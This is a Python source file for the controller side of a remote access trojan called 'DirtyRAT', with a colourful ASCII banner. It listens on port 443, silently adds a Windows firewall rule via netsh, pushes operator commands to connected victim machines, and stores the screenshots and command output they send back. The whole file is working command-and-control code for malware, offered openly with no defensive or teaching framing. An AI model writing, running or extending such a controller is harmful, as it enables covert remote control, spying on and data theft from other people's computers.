import socket
import struct
import threading
import subprocess
import platform
import os
import time
import datetime

def open_firewall_port(port):
    if platform.system() == "Windows":
        try:
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "add", "rule",
                 "name=RAT_Listener", "dir=in", "action=allow",
                 "protocol=TCP", f"localport={port}"],
                check=True
            )
            print(f"[+] Firewall rule opened for port {port}")
        except:
            print("[-] Could not open firewall. Try running as Administrator.")

class PlainSocket:
    def __init__(self, conn):
        self.conn = conn

    def send(self, data: bytes):
        length = struct.pack("!I", len(data))
        self.conn.sendall(length + data)

    def receive(self):
        try:
            length_data = self.conn.recv(4)
            if not length_data:
                return None
            length = struct.unpack("!I", length_data)[0]
            data = b""
            while len(data) < length:
                packet = self.conn.recv(length - len(data))
                if not packet:
                    return None
                data += packet
            return data
        except:
            return None

class RATServer:
    def __init__(self):
        self.server = socket.socket()
        self.server.bind(("0.0.0.0", 443))
        open_firewall_port(443)
        self.server.listen(5)
        print("[+] Server running on port 443...")

    def handle_client(self, conn, addr):
        print(f"[+] Connection from {addr}")
        plain = PlainSocket(conn)
        while True:
            try:
                cmd = input("rat> ").strip()
                if not cmd:
                    continue
                plain.send(cmd.encode())

                data = plain.receive()
                if not data:
                    print("[-] No response from client")
                    break

                if data.startswith(b"TYPE:SCREENSHOT"):
                    os.makedirs("screenshots", exist_ok=True)
                    filename = f"screenshots/screenshot_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                    image_data = data[len(b"TYPE:SCREENSHOT"):]
                    with open(filename, "wb") as f:
                        f.write(image_data)
                    print(f"[+] Screenshot saved as {filename}")

                elif data.startswith(b"TYPE:TEXT"):
                    try:
                        text = data[len(b"TYPE:TEXT"):].decode(errors="ignore")
                        print(text)
                    except UnicodeDecodeError:
                        print("[!] Failed to decode text response.")

                else:
                    # Fallback: save unknown binary for debug
                    os.makedirs("unknown", exist_ok=True)
                    filename = f"unknown/raw_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
                    with open(filename, "wb") as f:
                        f.write(data)
                    print(f"[!] Received unknown data. Saved as {filename}")

            except KeyboardInterrupt:
                print("\n[!] Server interrupted by user (Ctrl+C)")
                conn.close()
                os._exit(0)
            except (ConnectionResetError, BrokenPipeError):
                print("[-] Client disconnected.")
                break
            except Exception as e:
                print(f"[-] Unexpected Error: {e}")
                break

    def run(self):
        while True:
            conn, addr = self.server.accept()
            thread = threading.Thread(target=self.handle_client, args=(conn, addr))
            thread.start()

if __name__ == "__main__":
    # ANSI escape codes for colors
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    RESET = "\033[0m" # Reset to default color

    # Enhanced ASCII Art for "DirtyRAT" with colors and a border
    ascii_art = f"""
{GREEN}
 ██████████    ███             █████               ███████████              █████   
░░███░░░░███  ░░░             ░░███               ░░███░░░░░███            ░░███    
 ░███   ░░███ ████  ████████  ███████   █████ ████ ░███    ░███   ██████   ███████  
 ░███    ░███░░███ ░░███░░███░░░███░   ░░███ ░███  ░██████████   ░░░░░███ ░░░███░   
 ░███    ░███ ░███  ░███ ░░░   ░███     ░███ ░███  ░███░░░░░███   ███████   ░███    
 ░███    ███  ░███  ░███       ░███ ███ ░███ ░███  ░███    ░███  ███░░███   ░███ ███
 ██████████   █████ █████      ░░█████  ░░███████  █████   █████░░████████  ░░█████ 
░░░░░░░░░░   ░░░░░ ░░░░░        ░░░░░    ░░░░░███ ░░░░░   ░░░░░  ░░░░░░░░    ░░░░░  
                                         ███ ░███                                   
                                        ░░██████                                    
                                         ░░░░░░                                     
{RESET}
{CYAN}------------------------------------------------------------------{RESET}
{YELLOW}  [+] Initializing DirtyRAT Server... Standby for incoming connections.{RESET}
{CYAN}------------------------------------------------------------------{RESET}
"""
    print(ascii_art)


    RATServer().run()